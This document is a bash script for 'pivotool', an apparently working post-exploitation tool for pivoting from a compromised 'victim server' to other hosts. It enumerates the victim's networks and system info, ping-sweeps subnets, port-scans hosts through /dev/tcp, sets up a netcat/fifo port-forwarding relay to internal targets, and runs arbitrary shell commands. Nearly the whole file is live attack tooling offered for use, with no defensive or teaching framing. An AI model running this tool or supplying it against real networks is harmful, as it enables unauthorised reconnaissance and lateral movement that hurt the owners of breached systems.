#!/bin/bash

################################################################################
# pivotool -- by artuyero                                                      #
#                                                                              #
# As expected, is a simple tool written in bash that could help you in the     #
# post exploitation phase to pivot to other systems.                           #
# Usage:                                                                       #
# $ ./pivotool                                                                 #
# _PIVOTOOL_:~$ <command> <args>                                               #
################################################################################

# vars -------------------------------------------------------------------------
declare -a nets
declare -a targets
declare -a ports

PROMPT="_PIVOTOOL_:~$"

# banner -----------------------------------------------------------------------
banner(){
cat << "EOF"

██████╗ ██╗██╗   ██╗ ██████╗ ████████╗ ██████╗  ██████╗ ██╗
██╔══██╗██║██║   ██║██╔═══██╗╚══██╔══╝██╔═══██╗██╔═══██╗██║
██████╔╝██║██║   ██║██║   ██║   ██║   ██║   ██║██║   ██║██║
██╔═══╝ ██║╚██╗ ██╔╝██║   ██║   ██║   ██║   ██║██║   ██║██║
██║     ██║ ╚████╔╝ ╚██████╔╝   ██║   ╚██████╔╝╚██████╔╝███████╗
╚═╝     ╚═╝  ╚═══╝   ╚═════╝    ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝
by artuyero

EOF
}

# exit -------------------------------------------------------------------------
ctrl_c(){
        echo -e "[*] Exiting.\n"
        exit 1
}

trap ctrl_c INT

# usages -----------------------------------------------------------------------
usage(){
        echo "Usage:"
        echo "  $ ./pivotool.sh"
        echo
        echo "Commands:"
        echo "  get     Obtains data from the victim server and its environment."
        echo "  scan    Performs a scan of a network or host."
        echo "  pivot   Performs port forwarding."
        echo "  show    Displays the information that has been collected."
        echo "  exec    Run a bash command on the system."
        echo
        echo "Use the "-h" option after each command to get its help."
        echo
}

get_usage() {
        echo "[*] Displaying \"get\" help."
        echo
        echo "\$ get [flags] -> Obtains data from the victim server and its environment."
        echo
        echo "Flags:"
        echo "  -n    Gets the networks to which the host is connected."
        echo "  -i    Gets system info."
        echo
}

scan_usage() {
        echo "[*] Displaying \"scan\" help."
        echo
        echo "\$ scan [flags] -> Performs a scan of a network or host."
        echo
        echo "Flags:"
        echo "  -n INT    Performs a ping scan on the selected network."
        echo "  -t INT    Performs a simple port scan on the selected host."
        echo
}

pivot_usage() {
        echo "[*] Displaying \"pivot\" help."
        echo
        echo "\$ pivot [flags] -> Perform a port forwarding."
        echo
        echo "Flags:"
        echo "  -t INT    Index of the target (show -t)."
        echo "  -p INT    Remote port."
        echo "  -P INT    Local port."
        echo
}

show_usage() {
        echo "[*] Displaying \"show\" help."
        echo
        echo "$ show [flags} -> Displays the information that has been collected."
        echo
        echo "Flags:"
        echo "  -n    Show the nets"
        echo "  -t    Show the targets"
}

exec_usage() {
        echo "Displaying exec help"
}

# shows ------------------------------------------------------------------------
show_nets() {
        cont=0
        for net in "${nets[@]}"
        do
                echo "$cont -> $net"
                ((cont=cont+1))
        done  
}

show_targets() {
        cont=0
        for target in "${targets[@]}"
        do
                echo "$cont -> $target"
                ((cont=cont+1))
        done 
}

show_ports() {
        cont=0
        for port in "${ports[@]}"
        do
                echo "$cont -> ${targets[$cont]} : $port"
                ((cont=cont+1))
        done
}

# utils ------------------------------------------------------------------------
is_positive_integer() {
        if [ "$1" -ge 0 ] 2>/dev/null; then
                true
        else
                echo "[ERROR] Argument must be a positive integer. Got: $1"
                false
        fi
}

# commands ---------------------------------------------------------------------
get_command(){
        while getopts "hnt:i" opt; do
                case "$opt" in
                        h) # help
                                get_usage
                                return
                                ;;
                        n) # nets
                                nets=()
                                echo "[*] Getting nets."
                                temp=$(ip a | grep "inet " | awk '{print $2}')
                                for net in $(echo $temp)
                                do
                                        nets=( "${nets[@]}" "$net" )
                                done
                                show_nets
                                ;;
                        i) # system info
                                echo "[*] Getting system info."
                                echo $(uname -a)
                                ;;
                esac
        done
}

scan_command(){
        while getopts "hn:t:" opt; do
                case "$opt" in
                        h) # help
                                scan_usage
                                return
                                ;;
                        n) # ping scan
                                if [ "${#nets[@]}" -eq 0 ] ; then echo "[ERROR] There are no registered nets. Run 'get -n'."; return; fi
                                if ! is_positive_integer "$OPTARG" ; then return; fi
                                if [ "$OPTARG" -gt ${#nets[@]} ] ; then echo "[ERROR] Invalid network number. Enter from 0 to $((${#nets[@]}-1))"; return; fi
                                net=${nets[$OPTARG]}
                                echo "[*] Scanning net: $net"
                                BASE_IP=$(echo $net | awk -F\/ '{print $1}')
                                IP_CIDR=$(echo $net | awk -F\/ '{print $2}')
                                IP_MASK=$((0xFFFFFFFF << (32 - ${IP_CIDR})))
                                IFS=. read a b c d <<<${BASE_IP}
                                ip=$((($b << 16) + ($c << 8) + $d))
                                ipstart=$((${ip} & ${IP_MASK}))
                                ipend=$(((${ipstart} | ~${IP_MASK}) & 0x7FFFFFFE))
                                ips=$(seq ${ipstart} ${ipend} | while read i; do
                                        echo $a.$((($i & 0xFF0000) >> 16)).$((($i & 0xFF00) >> 8)).$(($i & 0x00FF))
                                done)
                                unset temp; temp=$(for i in $(echo $ips)
                                do
                                        ping -c 1 -W 5 ${i} | grep -q "bytes from" && echo "${i}" &
                                done; wait)
                                for host in $(echo $temp)
                                do
                                        echo "[*] Discovered ${host}"
                                        targets=( "${targets[@]}" "${host}" )
                                done
                                show_targets
                                ;;
                        t) # port scan
                                if [ "${#targets[@]}" -eq 0 ] ; then echo "[ERROR] There are no registered targets. Run 'scan -n <net>'."; return; fi
                                if ! is_positive_integer "$OPTARG" ; then return; fi
                                if [ "$OPTARG" -gt ${#targets[@]} ] ; then echo "[ERROR] Invalid target number. Enter from 0 to $((${#targets[@]}-1))"; return; fi
                                target=${targets[$OPTARG]}
                                echo "Scanning target: $target"
                                unset temp; temp=$(for i in $(seq 1 81)
                                do
                                        timeout 1 bash -c "echo > /dev/tcp/${target}/${i}" 2>/dev/null && echo -n "${i} " &
                                done; wait)
                                echo "[*] Discovered ${temp}"
                                ports=( "${ports[@]:0:$OPTARG}" "${temp}" "${ports[@]:$OPTARG}")
                                show_ports
                                ;;
                esac
        done
}

pivot_command(){
        while getopts "h?t:p:P:" opt; do
                case "$opt" in
                        h|\?)
                                pivot_usage
                                ;;
                        t)
                                if [ "${#targets[@]}" -eq 0 ] ; then echo "[ERROR] There are no registered targets. Run 'scan -n INT'."; return; fi
                                if ! is_positive_integer "$OPTARG" ; then return; fi
                                if [ "$OPTARG" -gt ${#targets[@]} ] ; then echo "[ERROR] Invalid target number. Enter from 0 to $((${#targets[@]}-1))"; return; fi
                                pivotTarget=$OPTARG
                                ;;
                        p)
                                remotePort=$OPTARG
                                ;;
                        P)
                                localPort=$OPTARG
                                ;;
                esac
        done
        if [ -z "$pivotTarget" ] || [ -z "$remotePort" ] || [ -z "$localPort" ]; then
                echo "[ERROR] Mandatory opts: -t -p -P"
                return
        else
                rm -f fifo;mkfifo fifo;nc -v -lk -p $localPort <fifo | nc -v $pivotTarget $remotePort >fifo
        fi
}

show_command(){
        while getopts "hntp" opt; do
                case "$opt" in
                        h)
                                show_usage
                                return
                                ;;
                        n)
                                show_nets
                                return
                                ;;
                        t)
                                show_targets
                                return
                                ;;
                        p)
                                show_ports
                                return
                                ;;
                esac
        done
}

exec_command() {
        echo "[*] Executing shell command: ${1}"
        bash -c "${1}"
}

# main -------------------------------------------------------------------------
banner
while true
do
        read -p "$PROMPT " line
        command=$(echo $line | cut -d " " -f1)
        args=$(echo $line | cut -d " " -f2-)
        case $(echo $command | cut -f1) in
                get)
                        get_command "$args"
                        ;;
                scan)
                        scan_command "$args"
                        ;;
                pivot)
                        pivot_command "$args"
                        ;;
                show)
                        show_command "$args"
                        ;;
                exec)
                        exec_command "$args"
                        ;;
                clear|
                      )
                        clear
                        ;;
                help|*)
                        usage
                        ;;
        esac
        unset OPTIND
done
